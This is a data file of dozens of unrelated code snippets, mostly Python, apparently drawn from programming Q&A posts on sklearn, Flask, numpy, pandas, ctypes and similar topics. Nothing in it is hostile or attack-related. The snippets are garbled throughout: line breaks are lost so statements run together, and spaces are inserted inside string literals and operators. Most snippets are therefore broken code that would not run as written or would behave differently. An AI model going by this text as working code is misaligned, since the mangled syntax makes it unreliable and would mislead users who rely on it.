category_1 category_1 category_1_small category_1_medium category_1_large15 medium 0 1 016 small 1 0 017 small 1 0 018 medium 0 1 019 small 1 0 020 small 1 0 0 from sklearn.linear_model import LogisticRegressionfrom sklearn.pipeline import Pipelinefrom sklearn.model_selection import KFold , GridSearchCV # Define Pipelineclf = LogisticRegression ( penalty='l1 ' ) pipeline_steps = [ ( 'dummy_vars ' , dummy_var_encoder ( ) ) , ( 'clf ' , clf ) ] pipeline = Pipeline ( pipeline_steps ) # Define hyperparams try for dummy-encoder and classifier # Fit 4 models - try dummying category_1 vs category_2 , and using l1 vs l2 penalty in log-regparam_grid = { 'dummy_vars__column_to_dummy ' : [ 'category_1 ' , 'category_2 ' ] , 'clf__penalty ' : [ 'l1 ' , 'l2 ' ] } # Define full model search process cv_model_search = GridSearchCV ( pipeline , param_grid , scoring='accuracy ' , cv = KFold ( ) , refit=True , verbose = 3 ) cv_model_search.fit ( X , y=y )"
"import numpy as npfrom PIL import Imagedef _remove_colormap ( filename ) : return np.array ( Image.open ( filename ) ) def _save_annotation ( annotation , filename ) : pil_image = Image.fromarray ( annotation.astype ( dtype=np.uint8 ) ) pil_image.save ( filename ) def main ( ) : raw_annotation = _remove_colormap ( '2007_000032.png ' ) _save_annotation ( raw_annotation , '2007_000032_output.png ' ) if __name__ == '__main__ ' : main ( )"
"image_file = StringIO ( open ( `` test.gif '' , 'rb ' ) .read ( ) ) imghdr.what ( image_file.getvalue ( ) ) print imghdr.what ( image_file.getvalue ( ) ) File `` /usr/lib/python2.7/imghdr.py '' , line 12 , in what f = open ( file , 'rb ' ) TypeError : file ( ) argument 1 must be encoded string without NULL bytes , not str"
"grid = [ [ nan , nan , nan , nan , nan ] , [ nan , nan , nan , nan , nan ] , [ nan , nan , 1 , nan , nan ] , [ nan , 2 , 3 , 2 , nan ] , [ 1 , 2 , 2 , 1 , nan ] ] grid = [ [ nan , nan , nan , nan ] , [ nan , nan , 1 , nan ] , [ nan , 2 , 3 , 2 ] , [ 1 , 2 , 2 , 1 ] ]"
"map.connect ( '/ ' , controller='index ' , conditions=dict ( sub_domain=False ) ) map.connect ( '/ ' , controller='mobileindex ' , conditions=dict ( sub_domain='m ' ) )"
def foobar ( ) : print ( 'FOOBAR ! ' ) class SampleClass : foo = foobar def printfunc ( self ) : self.foo ( )
"import apscheduler.schedulers.backgroundimport flaskapp = flask.Flask ( __name__ ) app.config [ 'DATABASE ' ] scheduler = apscheduler.schedulers.background.BackgroundScheduler ( ) scheduler.start ( ) def db ( ) : _db = flask.g.get ( '_db ' ) if _db is None : _db = get_db_connection_somehow ( app.config [ 'DATABASE ' ] ) flask.g._db = _db return _db @ scheduler.scheduled_job ( 'interval ' , hours=1 ) def do_a_thing ( ) : with app.app_context ( ) : db ( ) .do_a_thing ( ) import apscheduler.schedulers.backgroundimport flaskbp = flask.Blueprint ( 'my_blueprint ' , __name__ ) scheduler = apscheduler.schedulers.background.BackgroundScheduler ( ) scheduler.start ( ) def db ( ) : _db = flask.g.get ( '_db ' ) if _db is None : _db = get_db_connection_somehow ( flask.current_app.config [ 'DATABASE ' ] ) flask.g._db = _db return _db @ bp.recorddef record ( state ) : with state.app.app_context ( ) : flask.g._app = state.app @ scheduler.scheduled_job ( 'interval ' , hours=1 ) def do_a_thing ( ) : with flask.g._app.app_context ( ) : db ( ) .do_a_thing ( ) RuntimeError : Working outside of application context ."
"def displayRow ( request , row_id ) : row = Event.objects.get ( pk=row_id ) return render_to_response ( 'row.html ' , { 'row ' : row } ) def listEventsSummary ( request ) : listEventsSummary = Event.objects.all ( ) .order_by ( '-id ' ) [ :20 ] response = `` for event in listEventsSummary : response += str ( displayRow ( `` , event.id ) ) return HttpResponse ( response )"
"border_background = Image ( Geometry ( 220 , 220 ) , Color ( 'transparent ' ) ) drawer = Draw ( ) drawer.circle ( 110 , 110 , 33.75 , 33.75 ) drawer.fill_color ( Color ( 'white ' ) ) drawer.stroke_antialias ( False ) border_background.draw ( drawer.drawer ) border_background.composite ( original_thumbnail , 0 , 0 , CompositeOperator.OverCompositeOp )"
"for i , sub in enumerate ( datalist ) : subnum = i + start_with subplot ( 3 , 4 , i ) # format data ( sub is a PANDAS dataframe ) xdat = sub [ ' x ' ] [ ( sub [ 'in_trl ' ] == True ) & ( sub [ ' x ' ] .notnull ( ) ) & ( sub [ ' y ' ] .notnull ( ) ) ] ydat = sub [ ' y ' ] [ ( sub [ 'in_trl ' ] == True ) & ( sub [ ' x ' ] .notnull ( ) ) & ( sub [ ' y ' ] .notnull ( ) ) ] # plot hist2d ( xdat , ydat , bins=1000 ) plot ( 0 , 0 , 'ro ' ) # origin title ( 'Subject { 0 } in-Trial Gaze'.format ( subnum ) ) xlabel ( 'Horizontal Offset ( degrees visual angle ) ' ) ylabel ( 'Vertical Offset ( degrees visual angle ) ' ) xlim ( [ -.005 , .005 ] ) ylim ( [ -.005 , .005 ] ) # tight_layout # crashes ipython-notebook kernelshow ( ) fig = figure ( dpi=300 ) grid = ImageGrid ( fig , 111 , nrows_ncols= ( 3 , 4 ) , axes_pad=0.1 ) for gridax , ( i , sub ) in zip ( grid , enumerate ( eyelink_data ) ) : subnum = i + start_with # format data xdat = sub [ ' x ' ] [ ( sub [ 'in_trl ' ] == True ) & ( sub [ ' x ' ] .notnull ( ) ) & ( sub [ ' y ' ] .notnull ( ) ) ] ydat = sub [ ' y ' ] [ ( sub [ 'in_trl ' ] == True ) & ( sub [ ' x ' ] .notnull ( ) ) & ( sub [ ' y ' ] .notnull ( ) ) ] # plot gridax.hist2d ( xdat , ydat , bins=1000 ) plot ( 0 , 0 , 'ro ' ) # origin title ( 'Subject { 0 } in-Trial Gaze'.format ( subnum ) ) xlabel ( 'Horizontal Offset\n ( degrees visual angle ) ' ) ylabel ( 'Vertical Offset\n ( degrees visual angle ) ' ) xlim ( [ -.005 , .005 ] ) ylim ( [ -.005 , .005 ] ) show ( )"
# get_connection is a function that returns a connection to the db.with get_connection ( ) as conn : with conn.cursor ( ) as cursor : cursor.execute ( `` SELECT * FROM test_table '' ) or simply this : with get_connection ( ) as conn : cursor = conn.cursor ( ) cursor.execute ( `` SELECT * FROM test_table '' )
import foo.bar
"def myzip ( *args ) : iters = map ( iter , args ) while iters : res = [ next ( i ) for i in iters ] yield tuple ( res ) x= [ 1,2 ] x=iter ( x ) if x : print ( `` Still True '' ) next ( x ) next ( x ) if x : print ( `` Still True '' ) > > > list ( myzip ( 'abc ' , 'lmnop ' ) ) [ ( ' a ' , ' l ' ) , ( ' b ' , 'm ' ) , ( ' c ' , ' n ' ) ]"
"class User ( db.Model ) : id = db.Column ( db.Integer , primary_key=True ) email = db.Column ( db.Unicode ( 128 ) ) name = db.Column ( db.Unicode ( 128 ) ) password = db.Column ( db.Unicode ( 1024 ) ) authenticated = db.Column ( db.Boolean , default=False ) posts = db.relationship ( 'Post ' ) # -- -- -login requirements -- -- - def is_active ( self ) : # all users are active return True def get_id ( self ) : # returns the user e-mail return unicode ( self.email ) def is_authenticated ( self ) : return self.authenticated def is_anonymous ( self ) : # False as we do not support annonymity return False @ login_manager.user_loaderdef load_user ( email ) : return User.get_user ( email )"
"import numpy as npfrom __future__ import divisiona = 1.15898324042702949299155079643242061138153076171875b = 0b = np.nextafter ( a,1 ) print a , b In [ 12 ] : a = 1.15898324042702949299155079643242061138153076171875In [ 13 ] : aOut [ 13 ] : 1.1589832404270295In [ 14 ] : numpy.nextafter ( a,1 ) Out [ 14 ] : 1.1589832404270293In [ 15 ] : numpy.nextafter ( a , -1 ) Out [ 15 ] : 1.1589832404270293"
import pygamepygame.mixer.init ( ) pygame.mixer.music.load ( `` my_sentence.wav '' ) pygame.mixer.music.play ( ) while pygame.mixer.music.get_busy ( ) == True : continue
|| -- > My_Project_Folder/|| -- > Forked_Module/ | -- > docs/ | -- > Forked_Module/ | -- > __init__.py
"> > > import pickle > > > import cPickle > > > def dumps ( x ) : ... print repr ( pickle.dumps ( x ) ) ... print repr ( cPickle.dumps ( x ) ) ... > > > dumps ( 1 ) 'I1\n. '' I1\n . ' > > > dumps ( 'hello ' ) '' S'hello'\np0\n. '' '' S'hello'\np1\n . `` > > > dumps ( ( 1 , 2 , 'hello ' ) ) '' ( I1\nI2\nS'hello'\np0\ntp1\n. '' '' ( I1\nI2\nS'hello'\np1\ntp2\n . '' def is_reprable_key ( key ) : return type ( key ) in ( int , str , unicode ) or ( type ( key ) == tuple and all ( is_reprable_key ( x ) for x in key ) )"
"def f ( a , b ) : return ( a - b ) if a > b else 1 / 0 from unittest import TestCasefrom module import fclass ModuleTestCase ( TestCase ) : def test_a_greater_than_b ( self ) : self.assertEqual ( f ( 10 , 5 ) , 5 ) pytest test_module.py -- cov= . -- cov-branch -- cov-report html"
class Test : def __str__ ( self ) : return `` Test '' def p ( self ) : print ( str ( self ) ) def monkey ( x ) : x.__class__.__del__=pa=Test ( ) monkey ( a ) del a
c : \vendor\test > nosetests ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... SS ... ... S.S ... ... ... ... ... ... ... ... ... ... ... ... ..SSSSSSSSSSSSSSSSSS ... ... S ... .SSSS ... ... ... ... ... ..S..S ... SSSSSSSSSSSSSSSSSSSSSSS.SSSSSSSSSSSSSSSSSSSSS ... ... ... .SS ... ..SSSSSSS ... ... ... ... -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 327 tests in 629.369s
"> > > l { ' a ' : 5 , 'aa ' : 5 , ' c ' : 1 , ' b ' : 7 } > > > sorted ( l ) [ ' a ' , 'aa ' , ' b ' , ' c ' ] > > > sorted ( l.items ( ) ) [ ( ' a ' , 5 ) , ( 'aa ' , 5 ) , ( ' b ' , 7 ) , ( ' c ' , 1 ) ] > > > sorted ( l.items ( ) , reverse=True ) [ ( ' c ' , 1 ) , ( ' b ' , 7 ) , ( 'aa ' , 5 ) , ( ' a ' , 5 ) ] > > > sorted ( l.items ( ) , key=l.get , reverse=True ) [ ( ' a ' , 5 ) , ( 'aa ' , 5 ) , ( ' c ' , 1 ) , ( ' b ' , 7 ) ] > > > l { ' a ' : 5 , 'aa ' : 5 , ' c ' : 1 , ' b ' : 7 } > > > 5 > 7False > > > sorted ( l.items ( ) , key=l.get , reverse=True ) [ ( ' a ' , 5 ) , ( 'aa ' , 5 ) , ( ' c ' , 1 ) , ( ' b ' , 7 ) ] > > > sorted ( l , key=l.get , reverse=True ) [ ' b ' , ' a ' , 'aa ' , ' c ' ] > > > s=sorted ( l , key=l.get , reverse=True ) > > > s [ ' b ' , ' a ' , 'aa ' , ' c ' ] > > > s.sort ( ) > > > s [ ' a ' , 'aa ' , ' b ' , ' c ' ]"
"lena = np.matrix ( ' 1 1 0 0 ; 1 1 0 0 ; 0 0 1 0.2 ; 0 0 0.2 1 ' ) X = np.reshape ( lena , ( -1 , 1 ) ) print ( `` Compute structured hierarchical clustering ... '' ) st = time.time ( ) n_clusters = 3 # number of regionsleward = AgglomerativeClustering ( n_clusters=n_clusters , linkage='complete ' ) .fit ( X ) print wardlabel = np.reshape ( ward.labels_ , lena.shape ) print ( `` Elapsed time : `` , time.time ( ) - st ) print ( `` Number of pixels : `` , label.size ) print ( `` Number of clusters : `` , np.unique ( label ) .size ) print label [ [ 1 1 0 0 ] [ 1 1 0 0 ] [ 0 0 1 2 ] [ 0 0 2 1 ] ]"
"a = [ 1,2,3,4,5,6,7 ] function ( a ) print aa = [ 1,7,2,6,3,5,4 ]"
"class BaseHandler ( object ) : def prepare ( self ) : self.prepped = 1 super ( SubBaseHandler , self ) .prepare ( )"
"typedef void ( *callback_t ) ( double *x , int n ) ; void callback_test ( double* x , int n , callback_t callback ) ; # include `` test.h '' void callback_test ( double* x , int n , callback_t callback ) { for ( int i = 1 ; i < = 5 ; i++ ) { for ( int j = 0 ; j < n ; j++ ) { x [ j ] = x [ j ] / i ; } callback ( x , n ) ; } } # ! /usr/bin/env pythonimport numpy as npimport numpy.ctypeslib as npctimport ctypesimport os.patharray_1d_double = npct.ndpointer ( dtype=np.double , ndim=1 , flags='CONTIGUOUS ' ) callback_func = ctypes.CFUNCTYPE ( None , # return array_1d_double , # x ctypes.c_int # n ) libtest = npct.load_library ( 'libtest ' , os.path.dirname ( __file__ ) ) libtest.callback_test.restype = Nonelibtest.callback_test.argtypes = [ array_1d_double , ctypes.c_int , callback_func ] @ callback_funcdef callback ( x , n ) : print ( `` x : { 0 } , n : { 1 } '' .format ( x , n ) ) if __name__ == '__main__ ' : x = np.array ( [ 20 , 13 , 8 , 100 , 1 , 3 ] , dtype=np.double ) libtest.callback_test ( x , x.shape [ 0 ] , callback ) x : < ndpointer_ < f8_1d_CONTIGUOUS object at 0x7f9b55faba70 > , n : 6x : < ndpointer_ < f8_1d_CONTIGUOUS object at 0x7f9b55faba70 > , n : 6x : < ndpointer_ < f8_1d_CONTIGUOUS object at 0x7f9b55faba70 > , n : 6x : < ndpointer_ < f8_1d_CONTIGUOUS object at 0x7f9b55faba70 > , n : 6x : < ndpointer_ < f8_1d_CONTIGUOUS object at 0x7f9b55faba70 > , n : 6 callback_func = ctypes.CFUNCTYPE ( None , # return ctypes.POINTER ( ctypes.c_double ) , # x ctypes.c_int # n ) @ callback_funcdef callback ( x , n ) : print ( `` x : { 0 } , n : { 1 } '' .format ( x [ : n ] , n ) ) x : [ 20.0 , 13.0 , 8.0 , 100.0 , 1.0 , 3.0 ] , n : 6x : [ 10.0 , 6.5 , 4.0 , 50.0 , 0.5 , 1.5 ] , n : 6x : [ 3.3333333333333335 , 2.1666666666666665 , 1.3333333333333333 , 16.666666666666668 , 0.16666666666666666 , 0.5 ] , n : 6x : [ 0.8333333333333334 , 0.5416666666666666 , 0.3333333333333333 , 4.166666666666667 , 0.041666666666666664 , 0.125 ] , n : 6x : [ 0.16666666666666669 , 0.10833333333333332 , 0.06666666666666667 , 0.8333333333333334 , 0.008333333333333333 , 0.025 ] , n : 6"
del list [ index ] list.del ( index )
"< div class= '' divName '' > < div > < label > Price < /label > < div > 22.99 < /div > < /div > < div > < label > Ships from < /label > < span > EU < /span > < /div > < /div > t = open ( 'snippet.html ' , 'rb ' ) .read ( ) .decode ( 'iso-8859-1 ' ) s = BeautifulSoup ( t , 'lxml ' ) s.find ( 'div.divName [ label*=Price ] ' ) s.find ( 'div.divName [ label*=Ships from ] ' )"
@ dataclassclass MyClass : data : DataFrame SEED = 8675309 # Jenny 's Constant class MyClass : SEED = 8675309 # Jenny 's Constant def __init__ ( data ) : self.data = data
"for i in range ( a.shape [ 0 ] ) : for g in range ( a.shape [ 0 ] ) : if a [ i , : , : ] - a [ g , : , : ] < tolerance : # save the index here"
"{ `` 1 '' : [ 1988 , `` Anil 4 '' ] , `` 2 '' : [ 2000 , `` Chris 4 '' ] , `` 3 '' : [ 1988 , `` Rahul 1 '' ] , '' 4 '' : [ 2001 , `` Kechit 3 '' ] , `` 5 '' : [ 2000 , `` Phil 3 '' ] , `` 6 '' : [ 2001 , `` Ravi 4 '' ] , '' 7 '' : [ 1988 , `` Ramu 3 '' ] , `` 8 '' : [ 1988 , `` Raheem 5 '' ] , `` 9 '' : [ 1988 , `` Kranti 2 '' ] , '' 10 '' : [ 2000 , `` Wayne 1 '' ] , `` 11 '' : [ 2000 , `` Javier 2 '' ] , `` 12 '' : [ 2000 , `` Juan 2 '' ] , '' 13 '' : [ 2001 , `` Gaston 2 '' ] , `` 14 '' : [ 2001 , `` Diego 5 '' ] , `` 15 '' : [ 2001 , `` Fernando 1 '' ] } { year : [ Names of students in sorted order according to rank ] } { 1988 : [ `` Rahul 1 '' , '' Kranti 2 '' , '' Rama 3 '' , '' Anil 4 '' , '' Raheem 5 '' ] ,2000 : [ `` Wayne 1 '' , '' Javier 2 '' , '' Jaan 2 '' , '' Phil 3 '' , '' Chris 4 '' ] ,2001 : [ `` Fernando 1 '' , '' Gaston 2 '' , '' Kechit 3 '' , '' Ravi 4 '' , '' Diego 5 '' ] }"
"gcold = gc.isenabled ( ) gc.disable ( ) timing = self.inner ( it , self.timer ) if gcold : gc.enable ( )"
"{ 'result ' : { 'code ' : ' 1 ' , 'description ' : 'Success ' , 'errorUUID ' : None } , 'accounts ' : { 'accounts ' : [ { 'accountId ' : 1 , 'accountName ' : 'Ming ' , 'availableCredit ' : 1 } ] } } class MethodResultType : code : str description : str errorUUID : strclass AccountType : accountId : int accountName : str availableCredit : floatclass getAccounts : result : MethodResultType accounts : List [ AccountType ] # Attempt 1 accounts = TypedDict ( `` accounts '' , { `` accounts '' : List [ AccountType ] } ) # Attempt 2client = Client ( os.getenv ( `` API_URL '' ) , wsse=user_name_token ) accountsResponse : getAccounts = client.service.getAccounts ( ) accounts = accountsResponse.accounts.accounts # Attempt 1 : `` List [ AccountType ] '' has no attribute `` accounts '' ; maybe `` count '' ? # Attempt 2 : `` Type [ accounts ] '' has no attribute `` accounts '' from typing import List , TypedDict , Optional , Dictclass MethodResultType ( TypedDict ) : code : str description : str errorUUID : Optional [ str ] class AccountType ( TypedDict ) : accountId : int accountName : str availableCredit : floatclass getAccounts ( TypedDict ) : result : MethodResultType accounts : Dict [ str , List [ AccountType ] ] result : getAccounts = { 'result ' : { 'code ' : ' 1 ' , 'description ' : 'Success ' , 'errorUUID ' : None } , 'accounts ' : { 'accounts ' : [ { 'accountId ' : 1 , 'accountName ' : 'Ming ' , 'availableCredit ' : 1 } ] } } print ( result.result ) print ( result.accounts ) `` getAccounts '' has no attribute `` result '' '' getAccounts '' has no attribute `` accounts ''"
"# [ no_mangle ] pub extern fn make_array ( ) - > [ i32 ; 4 ] { let my_array : [ i32 ; 4 ] = [ 1,2,3,4 ] ; return my_array ; } In [ 20 ] : import ctypesIn [ 21 ] : from ctypes import cdllIn [ 22 ] : lib = cdll.LoadLibrary ( `` /home/user/RustStuff/embed/target/release/libembed.so '' ) In [ 23 ] : lib.make_array.restype = ctypes.ARRAY ( ctypes.c_int32 , 4 ) In [ 24 ] : temp = lib.make_array ( ) In [ 25 ] : [ i for i in temp ] Out [ 25 ] : [ 1 , 2 , -760202930 , 32611 ]"
"cmd : exec : mycmd aliases : [ my , cmd ] filter : sms : 'regex . *'load : exec : load filter : sms : 'load : . * $ 'echo : exec : echo % type : //recrequired : type : //rec required : exec : //str optional : aliases : type : //arr contents : //str length : { min : 1 , max : 10 } filter : type : //rec optional : sms : //str email : //str all : //str /Rx.py in make_schema ( self , schema ) 68 raise Error ( 'invalid schema argument to make_schema ' ) 69 -- - > 70 uri = self.expand_uri ( schema [ `` type '' ] ) 71 72 if not self.type_registry.get ( uri ) : raise `` unknown type % s '' % uriKeyError : 'type '"
"[ [ 0,0,0,0 ] , [ 0,1,2,0 ] , [ 0,0,0,0 ] ]"
variable= '' ; CREATEDBY~string~1~~72~0~0~0~~~0 ; CREATEDBYNAME~string~1~~800~0~0~0~~~1 ; CREATEDBYYOMINAME~string~1~~800~0~0~0~~~2 ; CREATEDON~date~1~yyyy-MM-dd HH : mm : ss.SSS~26~0~0~0~~~3 ; CREATEDONUTC~date~1~yyyy-MM-dd HH : mm : ss.SSS~26~0~0~0~~~4 '' variable [ variable.find ( `` ; '' ) +1 : myString.find ( `` ~ '' ) ]
"from pprint import pprintd = { `` b '' : `` Maria '' , `` c '' : `` Helen '' , `` a '' : `` George '' } pprint ( d , width = 1 ) { ' a ' : 'George ' , ' b ' : 'Maria ' , ' c ' : 'Helen ' } { ' b ' : 'Maria ' , ' c ' : 'Helen ' , ' a ' : 'George ' }"
"# query_result is the result of some filter operationfor obj in query_result : time_range , altitude_range = get_shape_range ( obj.coordinates ) # time range for example would be `` 2006-06-01 07:56:17 - ... '' query_result = query_result.filter ( DatabaseShape.coordinates.like ( ' % % % s % % ' % date ) ) class DatabasePolygon ( dbBase ) : __tablename__ = 'objects ' id = Column ( Integer , primary_key=True ) # primary key tag = Column ( String ) # shape tag color = Column ( String ) # color of polygon time_ = Column ( String ) # time object was exported hdf = Column ( String ) # filename plot = Column ( String ) # type of plot drawn on attributes = Column ( String ) # list of object attributes coordinates = Column ( String ) # plot coordinates for displaying to user notes = Column ( String ) # shape notes lat = Column ( String ) @ staticmethod def plot_string ( i ) : return constants.PLOTS [ i ] def __repr__ ( self ) : `` '' '' Represent the database class as a JSON object . Useful as our program already supports JSON reading , so simply parse out the database as separate JSON 'files ' `` '' '' data = { } for key in constants.plot_type_enum : data [ key ] = { } data [ self.plot ] = { self.tag : { 'color ' : self.color , 'attributes ' : self.attributes , 'id ' : self.id , 'coordinates ' : self.coordinates , 'lat ' : self.lat , 'notes ' : self.notes } } data [ 'time ' ] = self.time_ data [ 'hdfFile ' ] = self.hdf logger.info ( 'Converting unicode to ASCII ' ) return byteify ( json.dumps ( data ) )"
"class GetConnectedNodes ( object ) : '' '' '' Class for getting the connected nodes from a list of nodes in a paged way '' '' '' def __init__ ( self , list , query ) : # super ( GetConnectedNodes , self ) .__init__ ( ) self.nodes = [ ndb.model.Key ( 'Node ' , ' % s ' % x ) for x in list ] self.cursor = 0 self.MAX_QUERY = 100 # logging.info ( 'Max query - % d ' % self.MAX_QUERY ) self.max_connections = len ( list ) self.connections = deque ( ) self.query=querydef node_in_connected_nodes ( self ) : `` '' '' Checks if a node exists in the connected nodes of the next node in the node list . Will return False if it does n't , or the list of evidences for the connection if it does. `` '' '' while self.cursor < self.max_connections : if len ( self.connections ) == 0 : end = self.MAX_QUERY if self.max_connections - self.cursor < self.MAX_QUERY : end = self.max_connections - self.cursor self.connections.clear ( ) self.connections = deque ( ndb.model.get_multi_async ( self.nodes [ self.cursor : self.cursor+end ] ) ) connection = self.connections.popleft ( ) connection_nodes = connection.get_result ( ) .connections if self.query in connection_nodes : connection_sources = connection.get_result ( ) .sources # yields ( current node index in the list , sources ) yield ( self.cursor , connection_sources [ connection_nodes.index ( self.query ) ] ) self.cursor += 1 I 2012-08-23 16:58:01.643 Prioritizing HGNC:4839 - mem 32I 2012-08-23 16:59:21.819 Prioritizing HGNC:3003 - mem 380I 2012-08-23 17:00:00.918 Prioritizing HGNC:8932 - mem 468I 2012-08-23 17:00:01.424 Prioritizing HGNC:24771 - mem 435I 2012-08-23 17:00:20.334 Prioritizing HGNC:9300 - mem 417I 2012-08-23 17:00:48.476 Prioritizing HGNC:10545 - mem 447I 2012-08-23 17:01:01.489 Prioritizing HGNC:12775 - mem 485I 2012-08-23 17:01:46.084 Prioritizing HGNC:2001 - mem 564C 2012-08-23 17:02:18.028 Exceeded soft private memory limit with 628.609 MB after servicing 1 requests total"
"d = xr.DataArray ( [ 1 , 2 , 3 ] , coords= { ' a ' : [ ' x ' , ' x ' , ' y ' ] } , dims= [ ' a ' ] ) d.groupby ( ' a ' ) .mean ( ) ) # - > DataArray ( a : 2 ) array ( [ 1.5 , 3 . ] ) ` d = DataAssembly ( [ [ 1 , 2 , 3 ] , [ 4 , 5 , 6 ] ] , coords= { ' a ' : ( 'multi_dim ' , [ ' a ' , ' b ' ] ) , ' c ' : ( 'multi_dim ' , [ ' c ' , ' c ' ] ) , ' b ' : [ ' x ' , ' y ' , ' z ' ] } , dims= [ 'multi_dim ' , ' b ' ] ) d.groupby ( [ ' a ' , ' b ' ] ) # TypeError : ` group ` must be an xarray.DataArray or the name of an xarray variable or dimension a , b = np.unique ( d [ ' a ' ] .values ) , np.unique ( d [ ' b ' ] .values ) result = xr.DataArray ( np.zeros ( [ len ( a ) , len ( b ) ] ) , coords= { ' a ' : a , ' b ' : b } , dims= [ ' a ' , ' b ' ] ) for a , b in itertools.product ( a , b ) : cells = d.sel ( a=a , b=b ) merge = cells.mean ( ) result.loc [ { ' a ' : a , ' b ' : b } ] = merge # result = DataArray ( a : 2 , b : 2 ) > array ( [ [ 2. , 3 . ] , [ 5. , 6 . ] ] ) # Coordinates : # * a ( a ) < U1 ' x ' ' y ' # * b ( b ) int64 0 1"
"class Fibonacci : @ staticmethod def series ( ) : fprev = 1 fnext = 1 yield fnext while True : yield fnext fprev , fnext = fnext , fprev+fnextunder10 = ( i for i in Fibonacci.series ( ) if i < 10 ) for i in under10 : print i while True : yield fnext fprev , fnext = fnext , fprev+fnext under10 = ( i for i in Fibonacci.series ( ) if i < 10 )"
"> > > 1 in ( ) False > > > 1 in ( ) == FalseFalse > > > type ( 1 in ( ) ) < type 'bool ' > > > > 1 in ( ) == True , 1 in ( ) == False ( False , False ) > > > ( 1 in ( ) ) == FalseTrue > > > value = 1 in ( ) > > > value == FalseTrue"
"import pandas as pdimport numpy as npfrom pandas import HDFStore , DataFrameimport random , stringdummy_data = [ `` .join ( random.sample ( string.ascii_uppercase , 5 ) ) for i in range ( 100000 ) ] df_big = pd.DataFrame ( dummy_data , columns = [ 'Dummy_Data ' ] ) df_big [ 'Dummy_Data ' ] = df_big [ 'Dummy_Data ' ] .astype ( 'category ' ) df_small = pd.DataFrame ( [ 'New_category ' ] , columns = [ 'Dummy_Data ' ] ) df_small [ 'Dummy_Data ' ] = df_small [ 'Dummy_Data ' ] .astype ( 'category ' ) df_big.to_hdf ( 'h5_file.h5 ' , \ 'symbols_dict ' , format = `` table '' , data_columns = True , append = False , \ complevel = 9 , complib ='blosc ' ) df_small.to_hdf ( 'h5_file.h5 ' , \ 'symbols_dict ' , format = `` table '' , data_columns = True , append = True , \ complevel = 9 , complib ='blosc ' ) df_big [ 'Dummy_Data ' ] = df_big [ 'Dummy_Data ' ] .cat.codes.astype ( 'int32 ' ) df_small [ 'Dummy_Data ' ] = df_small [ 'Dummy_Data ' ] .cat.codes.astype ( 'int32 ' ) df_test = pd.read_hdf ( 'h5_file.h5 ' , key='symbols_dict ' ) print df_mydict.info ( ) < class 'pandas.core.frame.DataFrame ' > Int64Index : 100001 entries , 0 to 0 # The appending worked nowData columns ( total 1 columns ) : Dummy_Data 100001 non-null int32 # Categorical dtype gonedtypes : int32 ( 1 ) # I need to change dtype of cat.codes of categorical memory usage : 1.1 MB # Not of categorical itself"
"In [ 1 ] : import numpy as npIn [ 2 ] : a = np.zeros ( ( 3,3 ) ) In [ 3 ] : b = np.array ( np.identity ( 3 ) , dtype=bool ) In [ 4 ] : c = a [ b ] In [ 5 ] : c [ : ] = 9In [ 6 ] : aOut [ 6 ] : array ( [ [ 0. , 0. , 0 . ] , [ 0. , 0. , 0 . ] , [ 0. , 0. , 0 . ] ] ) In [ 7 ] : a [ b ] = 1In [ 8 ] : aOut [ 8 ] : array ( [ [ 1. , 0. , 0 . ] , [ 0. , 1. , 0 . ] , [ 0. , 0. , 1 . ] ] ) x = [ 1,2,3 ] x += [ 4 ] y = ( 1,2,3 ) y += ( 4 , )"
"A = [ 70 , 60 , 50 , 40 , 30 , 20 , 10 , 0 ] B = [ 1 , 2 , 3 , 4 ] [ ( A [ x ] , B [ y ] ) for x in range ( len ( A ) ) for y in range ( len ( B ) ) ] A [ 0 ] , B [ 0 ] A [ 1 ] , B [ 1 ] A [ 2 ] , B [ 2 ] A [ 3 ] , B [ 3 ] A [ 4 ] , B [ 0 ] A [ 5 ] , B [ 1 ] A [ 6 ] , B [ 2 ] A [ 7 ] , B [ 3 ]"
hobbies = [ ] # Add your code below ! for i in range ( 3 ) : Hobby = str ( raw_input ( `` Enter a hobby : '' ) ) hobbies.append ( Hobby ) print hobbies Hobby = raw_input ( `` Enter a hobby : '' )
ComboBox { model : mymodel.car_manufacturers onCurrentIndexChanged : mymodel.selected_manufacturer = currentIndex }
"import cv2from PIL import ImageGrabimport numpy as npdef processed ( image ) : grayscaled = cv2.cvtColor ( image , cv2.COLOR_BGR2GRAY ) thresholded = cv2.Canny ( grayscaled , threshold1 = 200 , threshold2 = 200 ) return thresholdeddef drawcard1 ( ) : screen = ImageGrab.grab ( bbox = ( 770,300,850,400 ) ) processed_img = processed ( np.array ( screen ) ) outside_contour , dummy = cv2.findContours ( processed_img.copy ( ) , 0,2 ) colored = cv2.cvtColor ( processed_img , cv2.COLOR_GRAY2BGR ) cv2.drawContours ( colored , outside_contour , 0 , ( 0,255,0 ) ,2 ) cv2.imshow ( 'resized_card ' , colored ) while True : drawcard1 ( ) if cv2.waitKey ( 25 ) & 0xFF == ord ( ' w ' ) : cv2.destroyAllWindows ( ) break"
"def set_active_border ( self , window ) : border_color = self.colormap.alloc_named_color ( \ `` # ff00ff '' ) .pixel window.change_attributes ( None , border_pixel=border_color , border_width = 2 ) self.dpy.sync ( )"
"Y = np.array ( [ 7,1 ] , dtype='int64 ' ) X = Y [ 0 ] *3+Y [ 1 ] a = Fraction ( 58 , X )"
"> > > try : ... 1/0 ... except Exception as potato : ... pass ... > > > format ( potato ) 'integer division or modulo by zero ' > > > 1/0Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > ZeroDivisionError : integer division or modulo by zero > > > import sys > > > potato = ? ? ?"
"> > > import logging > > > eval ( 'logging.DEBUG ' ) 10 > > > import logging , ast > > > ast.literal_eval ( 'logging.DEBUG ' ) Traceback ( most recent call last ) : ... ValueError : malformed node or string : < _ast.Attribute object at 0x7f1ccc55eeb8 >"
"a , b , c , d = sympy.symbols ( ' a , b , c , d ' ) eq1 = c*b*a + b*a + a + c*d True"
grammar = Literal ( `` from '' ) + Literal ( `` : '' ) + Word ( alphas )
